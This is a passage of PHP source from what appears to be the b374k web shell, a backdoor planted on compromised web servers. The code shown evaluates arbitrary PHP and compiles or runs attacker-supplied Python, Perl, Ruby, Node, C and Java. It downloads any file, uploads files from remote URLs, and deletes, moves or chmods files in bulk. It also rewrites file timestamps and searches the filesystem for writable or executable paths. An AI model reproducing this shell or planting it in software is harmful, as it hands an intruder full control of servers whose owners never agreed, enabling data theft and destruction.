    global $s_python, $s_perl, $s_ruby, $s_node, $s_nodejs, $s_gcc, $s_java, $s_javac, $s_tar, $s_wget, $s_lwpdownload, $s_lynx, $s_curl;
    $s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_nodejs", "s_gcc", "s_java", "s_javac", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
    foreach($s_access as $s){
        if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
        else{
            if(!isset($_COOKIE['b374k'])){
                $t = explode("_", $s);
                $t = check_access($t[1]);
                if($t!==false){
                    $$s = $t;
                    setcookie($s, $$s ,time() + $s_login_time);
                }
            }
        }
    }
    if(isset($_GP['dl']) && ($_GP['dl'] != "")){
        ob_end_clean();
        $f = $_GP['dl'];
        $fc = fgc($f);
        header("Content-type: application/octet-stream");
        header("Content-length: ".strlen($fc));
        header("Content-disposition: attachment; filename=\"".basename($f)."\";");
        echo $fc;
        die();
    }
    if(isset($_GP['z'])){
        $s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
        $s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
        $s_lists = explode("|", $s_buffer);
        $s_counter = 0;
        if(!empty($s_buffer)){
            if($_GP['z']=='moveok'){
                foreach($s_lists as $s_l) if(rename($s_l,$s_cwd.basename($s_l))) $s_counter++;
                if($s_counter>0) $s_result .= notif($s_counter." items moved");
                else $s_result .= notif("No items moved");
            }
            elseif($_GP['z']=='copyok'){
                foreach($s_lists as $s_l){
                    if(@is_dir($s_l)){
                        copys($s_l,$s_cwd.basename($s_l));
                        if(file_exists($s_cwd.basename($s_l))) $s_counter++;
                    }
                    elseif(@is_file($s_l)){
                        copy($s_l,$s_cwd.basename($s_l));
                        if(file_exists($s_cwd.basename($s_l))) $s_counter++;
                    }
                }
                if($s_counter>0) $s_result .= notif($s_counter." items copied");
                else $s_result .= notif("No items copied");
            }
            elseif($_GP['z']=='delok'){
                foreach($s_lists as $s_l){
                    if(@is_file($s_l)){
                        if(unlink($s_l)) $s_counter++;
                    }
                    elseif(@is_dir($s_l)){
                        rmdirs($s_l);
                        if(!file_exists($s_l)) $s_counter++;
                    }
                }
                if($s_counter>0) $s_result .= notif($s_counter." items deleted");
                else $s_result .= notif("No items deleted");
            }
            elseif(isset($_GP['chmodok'])){
                $s_mod = octdec($_GP['chmodok']);
                foreach($s_lists as $s_l) if(chmod($s_l,$s_mod)) $s_counter++;
                if($s_counter>0) $s_result .= notif($s_counter." items changed mode to ".decoct($s_mod));
                else $s_result .= notif("No items modified");
            }
            elseif(isset($_GP['touchok'])){
                $s_datenew = strtotime($_GP['touchok']);
                foreach($s_lists as $s_l) if(touch($s_l,$s_datenew)) $s_counter++;
                if($s_counter>0) $s_result .= notif($s_counter." items changed access and modification time to ".@date("d-M-Y H:i:s",$s_datenew));
                else $s_result .= notif("No items modified");
            }
            elseif(isset($_GP['compresszipok'])){
                $s_file = $_GP['compresszipok'];
                if(zip($s_lists, $s_file)) $s_result .= notif("Archive created : ".hss($s_file));
                else $s_result .= notif("Error creating archive file");
            }
            elseif(isset($_GP['compresstarok'])){
                $s_lists_ = array();
                $s_file = $_GP['compresstarok'];
                $s_file = basename($s_file);
                $s_lists__ = array_map("basename", $s_lists);
                $s_lists_ = array_map("pf", $s_lists__);
                exe("tar cf \"".$s_file."\" ".implode(" ", $s_lists_));
                if(@is_file($s_file)) $s_result .= notif("Archive created : ".hss($s_file));
                else $s_result .= notif("Error creating archive file");
            }
            elseif(isset($_GP['compresstargzok'])){
                $s_lists_ = array();
                $s_file = $_GP['compresstargzok'];
                $s_file = basename($s_file);
                $s_lists__ = array_map("basename", $s_lists);
                $s_lists_ = array_map("pf", $s_lists__);
                exe("tar czf \"".$s_file."\" ".implode(" ", $s_lists_));
                if(@is_file($s_file)) $s_result .= notif("Archive created : ".hss($s_file));
                else $s_result .= notif("Error creating archive file");
            }
            elseif(isset($_GP['extractzipok'])){
                $s_file = $_GP['extractzipok'];
                $zip = new ZipArchive();
                foreach($s_lists as $f){
                    $s_target = $s_file.basename($f,".zip");
                    if($zip->open($f)){
                        if(!@is_dir($s_target)) @mkdir($s_target);
                        if($zip->extractTo($s_target)) $s_result .= notif("Files extracted to ".hss($s_target));
                        else $s_result .= notif("Error extrating archive file");
                        $zip->close();
                    }
                    else $s_result .= notif("Error opening archive file");
                }
            }
            elseif(isset($_GP['extracttarok'])){
                $s_file = $_GP['extracttarok'];
                foreach($s_lists as $f){
                    $s_target = "";
                    $s_target = basename($f,".tar");
                    if(!@is_dir($s_target)) @mkdir($s_target);
                    exe("tar xf \"".basename($f)."\" -C \"".$s_target."\"");
                }
            }
            elseif(isset($_GP['extracttargzok'])){
                $s_file = $_GP['extracttargzok'];
                foreach($s_lists as $f){
                    $s_target = "";
                    if(strpos(strtolower($f), ".tar.gz")!==false) $s_target = basename($f,".tar.gz");
                    elseif(strpos(strtolower($f), ".tgz")!==false) $s_target = basename($f,".tgz");
                    if(!@is_dir($s_target)) @mkdir($s_target);
                    exe("tar xzf \"".basename($f)."\" -C \"".$s_target."\"");
                }
            }
        }
        setcookie("buffer", "" ,time() - $s_login_time);
        setcookie("massact", "" ,time() - $s_login_time);
    }
    if(isset($_GP['y'])){
        $s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
        $s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
        $s_lists = explode("|", $s_buffer);
        if(!empty($s_buffer)){
            if($_GP['y']=='delete'){
                $s_result .= notif("Delete ? <a href='".$s_self."z=delok"."'>Yes</a> | <a href='".$s_self."'>No</a>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='paste' && $s_massact=='cut'){
                $s_result .= notif("Move here ? <a href='".$s_self."z=moveok"."'>Yes</a> | <a href='".$s_self."'>No</a>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='paste' && $s_massact=='copy'){
                $s_result .= notif("Copy here ? <a href='".$s_self."z=copyok"."'>Yes</a> | <a href='".$s_self."'>No</a>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='chmod'){
                $s_result .= notif("Permissions ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='0755' name='chmodok'
style='width:30px;text-align:center;' maxlength='4' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='touch'){
                $s_result .= notif("Touch ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".@date("d-M-Y H:i:s",time())."'
name='touchok' style='width:130px;text-align:center;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='extractzip'){
                $s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".hss($s_cwd)."' name='extractzipok'
style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='extracttar'){
                $s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".hss($s_cwd)."' name='extracttarok'
style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='extracttargz'){
                $s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".hss($s_cwd)."' name='extracttargzok'
style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='compresszip'){
                $s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text'
value='".hss($s_cwd).substr(md5(time()),0,8).".zip' name='compresszipok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !'
/></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='compresstar'){
                $s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text'
value='".hss($s_cwd).substr(md5(time()),0,8).".tar' name='compresstarok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !'
/></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
            elseif($_GP['y']=='compresstargz'){
                $s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text'
value='".hss($s_cwd).substr(md5(time()),0,8).".tar.gz' name='compresstargzok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !'
/></form>");
                foreach($s_lists as $s_l) $s_result .= notif($s_l);
            }
        }
    }
    if(isset($_GP['img'])){
        ob_end_clean();
        $s_d = isset($_GP['d'])? $_GP['d']:"";
        $s_f = $_GP['img'];
        $s_inf = @getimagesize($s_d.$s_f);
        $s_ext = explode($s_f, ".");
        $s_ext = $s_ext[count($s_ext)-1];
         header("Content-type: ".$s_inf["mime"]);
         header("Cache-control: public");
        header("Expires: ".@date("r", @mktime(0,0,0,1,1,2030)));
        header("Cache-control: max-age=".(60*60*24*7));#
         readfile($s_d.$s_f);
         die();
    } 
    elseif(isset($_GP['oldname']) && isset($_GP['rename'])){
        $s_old = $_GP['oldname'];
        $s_new = $_GP['rename'];
        $s_renmsg = "";
        if(@is_dir($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "Directory ".$s_old." renamed to ".$s_new : "Unable to rename directory ".$s_old." to ".$s_new;
        elseif(@is_file($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "File ".$s_old." renamed to ".$s_new : "Unable to rename file ".$s_old." to ".$s_new;
        else $s_renmsg = "Cannot find the path specified ".$s_old;
        $s_result .= notif($s_renmsg);
        $s_fnew = $s_new;
    } 
    elseif(!empty($_GP['del'])){
        $s_del = trim($_GP['del']);
        $s_result .= notif("Delete ".basename($s_del)." ? <a href='".$s_self."delete=".pl($s_del)."'>Yes</a> | <a href='".$s_self."'>No</a>");
    } 
    elseif(!empty($_GP['delete'])){
        $s_f = $_GP['delete'];
        $s_delmsg = "";
        if(@is_file($s_f)) $s_delmsg = (unlink($s_f))? "File removed : ".$s_f : "Unable to remove file ".$s_f;
        elseif(@is_dir($s_f)){
            rmdirs($s_f);
            $s_delmsg = (@is_dir($s_f))? "Unable to remove directory ".$s_f : "Directory removed : ".$s_f;
        }
        else $s_delmsg = "Cannot find the path specified ".$s_f;
        $s_result .= notif($s_delmsg);
    } 
    elseif(!empty($_GP['mkdir'])){
        $s_f = $s_cwd.$_GP['mkdir'];
        $s_dirmsg = "";
        $s_num = 1;
        if(@is_dir($s_f)){
            $s_pos = strrpos($s_f,"_");
            if($s_pos!==false) $s_num = (int) substr($s_f, $s_pos+1);
            while(@is_dir(substr($s_f, 0, $s_pos)."_".$s_num)){
                $s_num++;
            }
            $s_f = substr($s_f, 0, $s_pos)."_".$s_num;
        }
        if(mkdir($s_f)) $s_dirmsg = "Directory created ".$s_f;
        else $s_dirmsg = "Unable to create directory ".$s_f;
        $s_result .= notif($s_dirmsg);
    } 
    if(isset($_GP['x']) && ($_GP['x']=='eval')){
        $s_code = "";
        $s_res = "";
        $s_evaloption = "";
        $s_lang = "php";
        if(isset($_GP['evalcode'])){
            $s_code = $_GP['evalcode'];
            $s_evaloption = (isset($_GP['evaloption']))? $_GP['evaloption']:"";
            $s_tmpdir = get_writabledir();
            if(isset($_GP['lang'])){$s_lang = $_GP['lang'];}
            if(strtolower($s_lang)=='php'){
                ob_start();
                eval($s_code);
                $s_res = ob_get_contents();
                ob_end_clean();
            }
            elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'||strtolower($s_lang)=='node'||strtolower($s_lang)=='nodejs'){
                $s_rand = md5(time().rand(0,100));
                $s_script = $s_tmpdir.$s_rand;
                if(file_put_contents($s_script, $s_code)!==false){
                    $s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
                    unlink($s_script);
                }
            }
            elseif(strtolower($s_lang)=='gcc'){
                $s_script = md5(time().rand(0,100));
                chdir($s_tmpdir);
                if(file_put_contents($s_script.".c", $s_code)!==false){
                    $s_scriptout = $s_win ? $s_script.".exe" : $s_script;
                    $s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_evaloption);
                    if(@is_file($s_scriptout)){
                        $s_res = $s_win ? exe($s_scriptout):exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
                        rename($s_scriptout, $s_scriptout."del");
                        unlink($s_scriptout."del");
                    }
                    unlink($s_script.".c");
                }
                chdir($s_cwd);
            }
            elseif(strtolower($s_lang)=='java'){
                if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
                    $s_classname = trim($s_r[1]);
                    $s_script = $s_classname;
                }
                else{
                    $s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
                    $s_script = $s_rand;
                    $s_code = "class ".$s_rand." { ".$s_code . " } ";
                }
                chdir($s_tmpdir);
                if(file_put_contents($s_script.".java", $s_code)!==false){
                    $s_res = exe("javac ".$s_script.".java");
                    if(@is_file($s_script.".class")){
                        $s_res .= exe("java ".$s_evaloption." ".$s_script);
                        unlink($s_script.".class");
                    }
                    unlink($s_script.".java");
                }
                chdir($s_pwd);
            }
        }
        $s_lang_available = "<option value='php'>php</option>";
        $s_selected = "";
        $s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_nodejs", "s_gcc", "s_javac");
        foreach($s_access as $s){
            if(isset($$s)){
                $s_t = explode("_", $s);
                $s_checked = ($s_lang == $s_t[1])? "selected" : "";
                $s_lang_available .= "<option value='".$s_t[1]."' ".$s_checked.">".$s_t[1]."</option>";
            }
        }
        $s_evaloptionclass = ($s_lang=="php")? "sembunyi":"";
        $s_e_result = (!empty($s_res))? "<pre id='evalres' class='bt' style='margin:4px 0 0 0;padding:6px 0;' >".hss($s_res)."</pre>":"";
        $s_result .= "<form action='".$s_self."' method='post'>
                    <textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'>".hss($s_code)."</textarea>
                    <table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /></p>
                    </td><td><select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'>
                    ".$s_lang_available."
                    </select>
                    </td>
                    <td><div title='If you want to give additional option to interpreter or compiler, give it here' id='additionaloption'
class='".$s_evaloptionclass."'>Additional option&nbsp;&nbsp;<input class='inputz' style='width:400px;' type='text' name='evaloption'
value='".hss($s_evaloption)."' id='evaloption' /></div></td>
                    </tr>
                    </table>
                    ".$s_e_result."
                    <input type='hidden' name='x' value='eval' />
                    </form>";
    } 
    elseif(isset($_GP['find'])){
        $s_p = $_GP['find'];
        $s_type = isset($_GP['type'])? $_GP['type'] : "sfile";
        $s_sfname = (!empty($_GP['sfname']))? $_GP['sfname']:'';
        $s_sdname = (!empty($_GP['sdname']))? $_GP['sdname']:'';
        $s_sfcontain = (!empty($_GP['sfcontain']))? $_GP['sfcontain']:'';
        $s_sfnameregexchecked = $s_sfnameicasechecked = $s_sdnameregexchecked = $s_sdnameicasechecked = $s_sfcontainregexchecked = $s_sfcontainicasechecked =
$s_swritablechecked = $s_sreadablechecked = $s_sexecutablechecked = "";
        $s_sfnameregex = $s_sfnameicase = $s_sdnameregex = $s_sdnameicase = $s_sfcontainregex = $s_sfcontainicase = $s_swritable = $s_sreadable = $s_sexecutable =
false;
        if(isset($_GP['sfnameregex'])){ $s_sfnameregex=true; $s_sfnameregexchecked="checked"; }
        if(isset($_GP['sfnameicase'])){ $s_sfnameicase=true; $s_sfnameicasechecked="checked"; }
        if(isset($_GP['sdnameregex'])){ $s_sdnameregex=true; $s_sdnameregexchecked="checked"; }
        if(isset($_GP['sdnameicase'])){ $s_sdnameicase=true; $s_sdnameicasechecked="checked"; }
        if(isset($_GP['sfcontainregex'])){ $s_sfcontainregex=true; $s_sfcontainregexchecked="checked"; }
        if(isset($_GP['sfcontainicase'])){ $s_sfcontainicase=true; $s_sfcontainicasechecked="checked"; }
        if(isset($_GP['swritable'])){ $s_swritable=true; $s_swritablechecked="checked"; }
        if(isset($_GP['sreadable'])){ $s_sreadable=true; $s_sreadablechecked="checked"; }
        if(isset($_GP['sexecutable'])){ $s_sexecutable=true; $s_sexecutablechecked="checked"; }
        $s_sexecb = (function_exists("is_executable"))? "<input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se'
".$s_sexecutablechecked." /><label class='css-label' for='se'>Executable</span>":"";
        $s_candidate = array();
        if(isset($_GP['sgo'])){
            $s_af = "";
            $s_candidate = getallfiles($s_p);
            if($s_type=='sfile') $s_candidate = @array_filter($s_candidate, "is_file");
            elseif($s_type=='sdir') $s_candidate = @array_filter($s_candidate, "is_dir");
            foreach($s_candidate as $s_a){
                if($s_type=='sdir'){
                    if(!empty($s_sdname)){
                        if($s_sdnameregex){
                            if($s_sdnameicase){if(!preg_match("/".$s_sdname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(!preg_match("/".$s_sdname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                        else{
                            if($s_sdnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sdname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(strpos(basename($s_a), $s_sdname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                    }
                }
                elseif($s_type=='sfile'){
                    if(!empty($s_sfname)){
                        if($s_sfnameregex){
                            if($s_sfnameicase){if(!preg_match("/".$s_sfname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(!preg_match("/".$s_sfname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                        else{
                            if($s_sfnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sfname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(strpos(basename($s_a), $s_sfname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                    }
                    if(!empty($s_sfcontain)){
                        $s_sffcontent = @fgc($s_a);
                        if($s_sfcontainregex){
                            if($s_sfcontainicase){if(!preg_match("/".$s_sfcontain."/i", $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(!preg_match("/".$s_sfcontain."/",  $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                        else{
                            if($s_sfcontainicase){if(strpos(strtolower($s_sffcontent), strtolower($s_sfcontain))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                            else{if(strpos($s_sffcontent, $s_sfcontain)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
                        }
                    }
                }
            }
        }
        $s_f_result = ""; $s_link="";
        foreach($s_candidate as $s_c){
            $s_c = trim($s_c);
            if($s_swritable && !@is_writable($s_c)) continue;
            if($s_sreadable && !@is_readable($s_c)) continue;
            if($s_sexecutable && !@is_executable($s_c)) continue;
            if($s_type=="sfile") $s_link = $s_self."view=".pl($s_c);
            elseif($s_type=="sdir") $s_link = $s_self."view=".pl(cp($s_c));
            $s_f_result .= "<p class='notif' ondblclick=\"return go('".adds($s_link)."',event);\"><a href='".$s_link."'>".$s_c."</a></p>";
        }
        $s_tsdir = ($s_type=="sdir")? "selected":"";
        $s_tsfile = ($s_type=="sfile")? "selected":"";
        if(!@is_dir($s_p)) $s_result .= notif("Cannot find the path specified ".$s_p);
        $s_result .= "<form action='".$s_self."' method='post'>
        <div class='mybox'><h2>Find</h2>
        <table class='myboxtbl'>
        <tr><td style='width:140px;'>Search in</td>
        <td colspan='2'><input style='width:100%;' value='".hss($s_p)."' class='inputz' type='text' name='find' /></td></tr>
        <tr onclick=\"findtype('sdir');\">
            <td>Dirname contains</td>
            <td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='".hss($s_sdname)."' /></td>
            <td>
                <input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' ".$s_sdnameregexchecked." /><label class='css-label' for='sdn'>Regex (pcre)</label>
                <input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' ".$s_sdnameicasechecked." /><label class='css-label' for='sdi'>Case
Insensitive</label>
            </td>
        </tr>
        <tr onclick=\"findtype('sfile');\">
            <td>Filename contains</td>
            <td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='".hss($s_sfname)."' /></td>
            <td>
                <input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' ".$s_sfnameregexchecked." /><label class='css-label' for='sfn'>Regex (pcre)</label>
                <input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' ".$s_sfnameicasechecked." /><label class='css-label' for='sfi'>Case
Insensitive</label>
            </td>
        </tr>
        <tr onclick=\"findtype('sfile');\">
            <td>File contains</td>
            <td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".hss($s_sfcontain)."' /></td>
            <td>
                <input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' ".$s_sfcontainregexchecked." /><label class='css-label' for='sff'>Regex
(pcre)</label>
                <input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' ".$s_sfcontainicasechecked." /><label class='css-label' for='sffi'>Case
Insensitive</label>
            </td>
        </tr>
        <tr>
            <td>Permissions</td>
            <td colspan='2'>
                <input type='checkbox' class='css-checkbox' name='swritable' id='sw' ".$s_swritablechecked." /><label class='css-label' for='sw'>Writable</label>
                <input type='checkbox' class='css-checkbox' name='sreadable' id='sr' ".$s_sreadablechecked." /><label class='css-label' for='sr'>Readable</label>
                ".$s_sexecb."
            </td>
        </tr>
        <tr><td>
        <input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' />
        </td>
        <td>
        <select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'>
            <option value='sfile' ".$s_tsfile.">Search file</option>
            <option value='sdir' ".$s_tsdir.">Search dir</option>
        </select>
        </td>
        <td></td></tr>
        </table>
        </div>
        </form>
        <div>
        ".$s_f_result."
        </div>";
    } 
    elseif(isset($_GP['x']) && ($_GP['x']=='upload')){
        $s_result = " ";
        $s_msg = "";
        if(isset($_GP['uploadhd'])){
            $c = count($_FILES['filepath']['name']);
            for($i = 0; $i<$c; $i++){
                $s_fn = $_FILES['filepath']['name'][$i];
                if(empty($s_fn)) continue;
                if(is_uploaded_file($_FILES['filepath']['tmp_name'][$i])){
                    $s_p = cp($_GP['savefolder'][$i]);
                    if(!@is_dir($s_p)) mkdir($s_p);
                    if(isset($_GP['savefilename'][$i]) && (trim($_GP['savefilename'][$i])!="")) $s_fn = $_GP['savefilename'][$i];
                    $s_tm = $_FILES['filepath']['tmp_name'][$i];
                    $s_pi = cp($s_p).$s_fn;
                    $s_st = @move_uploaded_file($s_tm,$s_pi);
                    if($s_st) $s_msg .= notif("File uploaded to <a href='".$s_self."view=".pl($s_pi)."'>".$s_pi."</a>");
                    else $s_msg .= notif("Failed to upload ".$s_fn);
                }
                else $s_msg .= notif("Failed to upload ".$s_fn);
            }
        }
        elseif(isset($_GP['uploadurl'])){
            $c = count($_GP['fileurl']);
            for($i = 0; $i<$c; $i++){
                $s_fu = $_GP['fileurl'][$i];
                if(empty($s_fu)) continue;
                $s_p = cp($_GP['savefolderurl'][$i]);
                if(!@is_dir($s_p)) mkdir($s_p);
                $s_fn = basename($s_fu);
                if(isset($_GP['savefilenameurl'][$i]) && (trim($_GP['savefilenameurl'][$i])!="")) $s_fn = $_GP['savefilenameurl'][$i];
                $s_fp = cp($s_p).$s_fn;
                $s_st = dlfile($s_fu,$s_fp);
                if($s_st) $s_msg .= notif("File uploaded to <a href='".$s_self."view=".pl($s_fp)."'>".$s_fp."</a>");
                else $s_msg .= notif("Failed to upload ".$s_fn);
            }
        }
        else{
            if(!@is_writable($s_cwd)) $s_msg = notif("Directory ".$s_cwd." is not writable, please change to a writable one");
        }
        if(!empty($s_msg)) $s_result .= $s_msg;
        $s_result .= "
            <form action='".$s_self."' method='post' enctype='multipart/form-data'>
            <div class='mybox'><h2><div class='but' onclick='adduploadc();'>+</div>Upload from computer</h2>
            <table class='myboxtbl'>
            <tbody id='adduploadc'>
            <tr><td style='width:140px;'>File</td><td><input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /></td></tr>
            <tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='".hss($s_cwd)."' /></td></tr>
            <tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /></td></tr>
            </tbody>
            <tfoot>
            <tr><td>&nbsp;</td><td>
            <input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
            <input type='hidden' name='x' value='upload' />
            </td></tr>
            </tfoot>
            </table>
            </div>
            </form>
            <form action='".$s_self."' method='post'>
            <div class='mybox'><h2><div class='but' onclick='adduploadi();'>+</div>Upload from internet</h2>
            <table class='myboxtbl'>
            <tbody id='adduploadi'>
            <tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' />
            </td></tr>
            <tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='".hss($s_cwd)."' /></td></tr>
            <tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /></td></tr>
            </tbody>
            <tfoot>
            <tr><td>&nbsp;</td><td>
            <input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
            <input type='hidden' name='x' value='upload' />
            </td></tr>
            </table>
            </div>
            </form>";
    } 
    elseif(isset($_GP['view'])){
        $s_f = $_GP['view'];
        if(isset($s_fnew) && (trim($s_fnew)!="")) $s_f = $s_fnew;
        $s_owner = "";
        if(@is_file($s_f)){
            $targetdir = dirname($s_f);
            chdir($targetdir);
            $s_cwd = cp(getcwd());
            setcookie("cwd", $s_cwd ,time() + $s_login_time);
            if(!$s_win && $s_posix){
                $s_name = posix_getpwuid(fileowner($s_f));
                $s_group = posix_getgrgid(filegroup($s_f));
                $s_owner = "<tr><td>Owner</td><td>".$s_name['name']."<span class='gaya'>:</span>".$s_group['name']."</td></tr>";
            }
            $s_filn = basename($s_f);
            $s_result .= "<table class='viewfile' style='width:100%;'>
            <tr><td style='width:140px;'>Filename</td><td><span id='".cs($s_filn)."_link'>".$s_f."</span>
            <div id='".cs($s_filn)."_form' class='sembunyi'>
            <form action='".$s_self."' method='post'>
                <input type='hidden' name='oldname' value='".hss($s_f)."' style='margin:0;padding:0;' />
                <input type='hidden' name='view' value='".hss($s_f)."' />
                <input class='inputz' style='width:200px;' type='text' name='rename' value='".hss($s_f)."' />
                <input class='inputzbut' type='submit' value='rename' />
            </form>
            <input class='inputzbut' type='button' value='x' onclick=\"tukar_('".cs($s_filn)."_form','".cs($s_filn)."_link');\" />
            </div>
            </td></tr>
            <tr><td>Size</td><td>".gs($s_f)." (".@filesize($s_f).")</td></tr>
            <tr><td>Permission</td><td>".gp($s_f)."</td></tr>
            ".$s_owner."
            <tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($s_f))."</td></tr>
            <tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($s_f))."</td></tr>
            <tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($s_f))."</td></tr>
            <tr><td>Actions</td><td>
            <a href='".$s_self."edit=".pl($s_f)."' title='edit'>edit</a> | <a href='".$s_self."hexedit=".pl($s_f)."' title='edit as hex'>hex</a> | <a
href=\"javascript:tukar_('".cs($s_filn)."_link','".cs($s_filn)."_form');\" title='rename'>ren</a> | <a href='".$s_self."del=".pl($s_f)."' title='delete'>del</a>
| <a href='".$s_self."dl=".pl($s_f)."'>dl</a>
            </td></tr>
            <tr><td>View</td><td>
            <a href='".$s_self."view=".pl($s_f)."&type=text"."'>text</a> | <a href='".$s_self."view=".pl($s_f)."&type=code"."'>code</a> | <a
href='".$s_self."view=".pl($s_f)."&type=image"."'>image</a> | <a href='".$s_self."view=".pl($s_f)."&type=audio"."'>audio</a> | <a
href='".$s_self."view=".pl($s_f)."&type=video"."'>video</a>
            </td></tr>
            </table>";
            $s_t = ""; $s_mime = "";
   
